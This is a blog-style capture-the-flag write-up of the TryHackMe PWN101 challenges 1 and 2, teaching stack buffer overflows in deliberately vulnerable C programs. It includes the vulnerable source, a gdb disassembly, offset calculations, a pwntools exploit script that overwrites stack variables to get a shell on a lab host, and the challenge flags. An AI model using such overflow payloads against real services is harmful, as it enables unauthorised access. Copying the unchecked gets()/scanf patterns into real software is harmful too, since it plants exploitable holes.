---
title: 'TryHackMe PWN101 Write-Up (Part 1)'
date: 2026-06-15T20:13:00+07:00
tags: ["ctf", "pwn"]
---

## Challenge 1: Buffer Overflow

> This should give you a start: 'AAAAAAAAAAA'
>
> Challenge is running on port **9001**

The program is asking us for an input. Based on the author's hint and by common sense, I tried spamming a lot of AAAAAAAAAA's and making it longer and longer until it eventually gives us the server's shell, so we can directly `cat flag.txt`to read the flag.

```
$ nc 10.48.154.125 9001
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Nah bruh, you lied me :(
She did Tomato rice instead of briyani :/
$ nc 10.48.154.125 9001
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Thanks, Here's a small gift for you <3
ls
flag.txt
pwn101
pwn101.c
cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}
```
However, I wanted to actually learn what happened, so let's have a look at the source code (which is also given away in the shell's working directory).

```c
#include <stdio.h>
#include <stdlib.h>

void setup(){
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);
}

void banner(){
    puts(
"       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐\n"
"        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ \n"
"        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘\n"
"                 pwn 101          \n"
    );
}

void main(){
    char inp[50];
    int is1337 = 1337;
    setup();
    banner();

    puts("Hello!, I am going to shopping.\n"
    "My mom told me to buy some ingredients.\n"
    "Ummm.. But I have low memory capacity, So I forgot most of them.\n"
    "Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n");
    puts("Type the required ingredients to make briyani: ");
    gets(inp);

    if (is1337 == 1337){
        puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
        exit(1337);
    }
    else{
        puts("Thanks, Here's a small gift for you <3");
        system("/bin/sh");
    }
}
```

Notice that the program initializes a variable `is1337` with a value of `1337`.  Later in the program, it asks us for our input, and then it checks whether or not the `is1337` variable is still `1337`. If it has changed for some reason, it will invoke a shell for us. Otherwise, it will just exit.

To be clear, our objective is to get the server's shell so that we can open the flag. That means we have to somehow change the contents of `is1337`. But how can we exactly do that?

Let's go back to our source code, and take a look at these statements:
```c
...
char inp[50];
...
gets(inp);
```

The program declares a buffer  named `inp` with the size of `50` bytes. `gets` is basically a function that can read input. In this case, `gets` will read our input into our `inp`.

When we encounter any library function we don't know much about, it's helpful to read the official documentation. And if we check out the `gets` function's manpage, there's this interesting information:

> Never use this function.
> gets()  reads  a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with  a  null  byte  ('\0'). No check for buffer overrun is performed (see BUGS below).

Whoops, "never use this function"? Let's read some more:

> BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in
       advance  how many characters gets() will read, and because gets() will continue
       to store characters past the end of the buffer, it is  extremely  dangerous  to
       use.  It has been used to break computer security.  Use fgets() instead.

This is a vulnerability. `gets` will read all the way past the end of the buffer without checking how long our input is or whether it actually fits into the buffer. It's only gonna stop when it finds a newline or EOF. Even though we set `inp` to only have 50 bytes, we can still give a, say, 100 bytes of input and the program won't care.

This is called a buffer overflow, of which I found a better technical definition on [Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow):

>In programming and information security, a buffer overflow or buffer overrun is an anomaly whereby a program writes data to a buffer beyond the buffer's allocated memory, overwriting adjacent memory locations.

Remember that memory is just contiguous line of addresses inside our program? Since both `inp` and `is1337` are declared under the same function, they must be somewhere near to each other in the stack. Therefore, it's possible to corrupt/modify the value of `is1337` by overflowing the `inp` buffer until it eventually reaches `is1337`'s location.

We can connect to the chall's instance again and try sending more than 50 bytes of input (right now we don't care about the numbers, but after some fuzzing I found 60 A's to be enough to trigger the shell).

Flag: `THM{7h4t's_4n_3zy_oveRflowwwww}`

## Challenge 2: Modify Variable's Value

Since we are actually given the binary for every challenge, let's actually decompile this one to see if we can understand what it does. But before that, it's good do a quick check on what type of binary we are dealing with:

```
$ file pwn102-1644307392479.pwn102
pwn102-1644307392479.pwn102: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2612b87a7803e0a8af101dc39d860554c652d165, not stripped
```
We see it's a Linux x86-64 binary, which is 64-bit.

Okay, now let's decompile the program. This is what Ghidra gave me for the `main` function (after renaming some variables just to make it slightly easier to read):

```c
void main(void)

{
  undefined1 buf[104];
  int some_var1;
  int some_var2;

  setup();
  banner();
  some_var2 = 0xbadf00d;
  some_var1 = 0xfee1dead;
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  scanf("%s",buf);
  if ((some_var2 == 0xc0ff33) && (some_var1 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}
```

This time, the program declares 3 variables:  `buf`, a 104-bytes buffer which is where our input will go into; `some_var1` which is initialized to the hex value `0xbadf00d`; and `some_var2` whose value is initialized to `0xfee1dead`. After getting our input, it checks whether `some_var2` is set to `0xc0ff33` *and* `some_var1` is set to `0xc0d3`. If both conditions are met, it'll give a shell.

After some reading, I learnt that

```c
scanf("%s",buf);
```

is vulnerable to buffer overflow. Here's a quote from an [article](https://jofrada.pt/mini_articles/C_vulns_scanf) I find helpful:
> You should never use the %s format with scanf or fscanf.
>
> With scanf the input comes from stdin, so %s will read an arbitrary user-controlled amount of bytes to the target buffer.

Great, now that we know `scanf` is vulnerable to buffer overflow, we can overwrite the value of `some_var1` and `some_var2`. But how do we control what we actually write to them? In the previous challenge, we didn't care about what eventually goes into `is1337` or how far away it is from our input. This time, we have to be more precise.

In this case, I found gdb's disassembly tool to be helpful. Let's open up our binary on gdb and disassemble the main function:

```
pwndbg> disas main
Dump of assembler code for function main:
   0x00000000000008fe <+0>:     push   rbp
   0x00000000000008ff <+1>:     mov    rbp,rsp
   0x0000000000000902 <+4>:     sub    rsp,0x70
   0x0000000000000906 <+8>:     mov    eax,0x0
   0x000000000000090b <+13>:    call   0x88a <setup>
   0x0000000000000910 <+18>:    mov    eax,0x0
   0x0000000000000915 <+23>:    call   0x8eb <banner>
   0x000000000000091a <+28>:    mov    DWORD PTR [rbp-0x4],0xbadf00d
   0x0000000000000921 <+35>:    mov    DWORD PTR [rbp-0x8],0xfee1dead
   0x0000000000000928 <+42>:    mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000092b <+45>:    mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000092e <+48>:    mov    esi,eax
   0x0000000000000930 <+50>:    lea    rdi,[rip+0x212]        # 0xb49
   0x0000000000000937 <+57>:    mov    eax,0x0
   0x000000000000093c <+62>:    call   0x730 <printf@plt>
   0x0000000000000941 <+67>:    lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:    mov    rsi,rax
   0x0000000000000948 <+74>:    lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:    mov    eax,0x0
   0x0000000000000954 <+86>:    call   0x750 <__isoc99_scanf@plt>
   0x0000000000000959 <+91>:    cmp    DWORD PTR [rbp-0x4],0xc0ff33
   0x0000000000000960 <+98>:    jne    0x992 <main+148>
   0x0000000000000962 <+100>:   cmp    DWORD PTR [rbp-0x8],0xc0d3
   0x0000000000000969 <+107>:   jne    0x992 <main+148>
   0x000000000000096b <+109>:   mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000096e <+112>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000971 <+115>:   mov    esi,eax
   0x0000000000000973 <+117>:   lea    rdi,[rip+0x1ef]        # 0xb69
   0x000000000000097a <+124>:   mov    eax,0x0
   0x000000000000097f <+129>:   call   0x730 <printf@plt>
   0x0000000000000984 <+134>:   lea    rdi,[rip+0x1f4]        # 0xb7f
   0x000000000000098b <+141>:   call   0x720 <system@plt>
   0x0000000000000990 <+146>:   jmp    0x9a8 <main+170>
   0x0000000000000992 <+148>:   lea    rdi,[rip+0x1ef]        # 0xb88
   0x0000000000000999 <+155>:   call   0x710 <puts@plt>
   0x000000000000099e <+160>:   mov    edi,0x539
   0x00000000000009a3 <+165>:   call   0x760 <exit@plt>
   0x00000000000009a8 <+170>:   leave
   0x00000000000009a9 <+171>:   ret
```

That looks quite long, but thankfully I found that the only parts that matter are:

```
   0x0000000000000941 <+67>:    lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:    mov    rsi,rax
   0x0000000000000948 <+74>:    lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:    mov    eax,0x0
   0x0000000000000954 <+86>:    call   0x750 <__isoc99_scanf@plt>
   0x0000000000000959 <+91>:    cmp    DWORD PTR [rbp-0x4],0xc0ff33
   0x0000000000000960 <+98>:    jne    0x992 <main+148>
   0x0000000000000962 <+100>:   cmp    DWORD PTR [rbp-0x8],0xc0d3
   0x0000000000000969 <+107>:   jne    0x992 <main+148>
```

See the hex values `0xc0ff33` and `0xc0d3`, along with `cmp` (compare) instructions in the same line? We can kinda make sense that it's doing pretty much the same thing as:

```c
if ((some_var2 == 0xc0ff33) && (some_var1 == 0xc0d3))
```

in the decompiled code.

In `main<+91>`, `cmp` compares whatever is inside `[rbp-0x4]` with `0xc0ff33`, and in `main<+100>`, `cmp` compares whatever is inside `[rbp-0x8]` with `0xc0d3`. Therefore, we can deduce that our `some_var1` variable will be stored in `[rbp-0x8]`, while our `some_var2` will be stored in  `[rbp-0x4]`.

> Note that, based on my understanding, something like rbp-0x8 or rbp-0x4 is a way to express a memory location relative to the rbp register. So, for example, rbp-0x10 means a memory address that is 0x10 bytes (or, in decimal, 16 bytes) away from rbp (the base pointer). We don't care about the actual address rbp or our variables are in, as now we only care how far apart are our variables located relative to each other so we can overwrite them. Just keep in mind the '0x' denotes that it is in hexadecimal.

Now that we know where `some_var1` and `some_var2` is, let's find out where our `buf` is relative to them.

Going back to the disassembly, just before the comparisons, we can see how the program calls `scanf`:

```
   0x0000000000000941 <+67>:    lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:    mov    rsi,rax
   0x0000000000000948 <+74>:    lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:    mov    eax,0x0
   0x0000000000000954 <+86>:    call   0x750 <__isoc99_scanf@plt>
```

Recall that the binary we're dealing with is a 64-bit Linux binary. Based on the x86-64 System V AMD64 ABI calling convention[^1], the order of registers to which any function arguments are passed are: `rdi`, then `rsi`, then `rdx`, and so on.

Since we're calling `scanf`, the first argument (the one that goes into `rdi`) will be the format string. The second argument, which goes into `rsi`, will the the variable our input will go to (which is `buf` in our case).

In that sense, this:

```
   0x0000000000000941 <+67>:    lea    rax,[rbp-0x70]
   0x0000000000000945 <+71>:    mov    rsi,rax
```

means that `buf` is in whatever memory address is loaded into `rsi`, which happens to be the address `[rbp-0x70]`.

To sum up, now we got all locations of the variables we need relative to `rbp`:

```
buf => [rbp-0x70]
some_var1 => [rbp-0x8]
some_var2 => [rbp-0x4]
```

If we subtract the offset of `buf` (`0x70`) with the offset of `some_var` (`0x8`), we get the value 104 bytes in decimal, which means `some_var1` is 104 bytes away from the start of our input. 

```
pwndbg> p 0x70 - 0x8
$1 = 0x68
pwndbg> p/d 0x70 - 0x8
$2 = 104
```

Doing the same thing, we get that `some_var2` is only 4 bytes away from `some_var1`.

```
pwndbg> p 0x8 - 0x4
$3 = 0x4
pwndbg> p/d 0x8 - 0x4
$4 = 4
```

Alright, so based on the informations we gathered, we want our payload to look like this:

```
104 bytes of random input
+ 4 bytes of the hex value: 0xc0d3
+ 4 bytes of the hex value: 0xc0ff33
```

> Another thing to note is that one byte is equal to two hex digits. So for our hex values, we actually want them to look more like:
> 	`0x0000c0d3` and `0x00c0ff33`
>when we send the payload.
>
> This confused me at first, but it really helped me understand why I have to wrap them in `p32()` in the exploit script later. What `p32()` essentially does is it takes our hex value inside it and packs it into 32 bits, a.k.a 4 bytes, which is what we want.
>

Now all we need to do is translate our payload into an exploit script. For this, I used python3 with the Pwntools library[^2].

```python
#!/usr/bin/env python3

from pwn import *

BINARY = './pwn102-1644307392479.pwn102'
HOST = '10.48.154.125'
PORT = 9002

exe = context.binary = ELF(BINARY)
context.log_level = 'DEBUG'

io = connect(HOST, PORT)
# io = process(BINARY)

payload = b'A'*104
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

io.recvline()
io.sendlineafter(b'Am I right? ', payload)

io.interactive()
```

And we succesfully got a shell!

```
$ python3 exploit.py
[*] '/home/nia/pwn101/chall02/pwn102-1644307392479.pwn102'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Opening connection to 10.48.154.125 on port 9002: Done
[*] Switching to interactive mode
Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
$
```

Flag: `THM{y3s_1_n33D_C0ff33_to_C0d3_<3}`

[^1]: See [Calling Conventions by CTF101](https://ctf101.org/binary-exploitation/what-are-calling-conventions/) and [this Wikipedia page](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI)
[^2]: I found this guide helpful: [Pwntools Tricks and Examples by Agr0 Hacks Stuff](https://agrohacksstuff.io/posts/pwntools-tricks-and-examples/)
